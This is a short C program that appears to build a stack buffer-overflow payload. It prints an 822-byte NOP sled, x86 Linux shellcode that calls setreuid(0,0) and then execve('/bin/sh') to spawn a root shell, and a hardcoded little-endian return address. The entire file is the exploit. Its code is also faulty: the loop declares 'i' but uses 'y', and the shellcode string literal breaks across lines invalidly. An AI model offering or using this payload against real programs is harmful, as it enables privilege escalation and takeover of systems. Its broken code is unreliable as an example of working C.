#include <stdio.h>

int main(){
	/*Puts into the buffer as many NOP as many are necessary to go 
        into Segmentation Fault*/
	for(int i=0; y<822; y++)
		printf("\x90");

	//That's the ShellCode
	printf("\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31
	\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d
	\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68");
	
	//That's the buffer address written following Little Endian logic
	printf("\x78\xc4\xff\xff");
 	return 0;
}
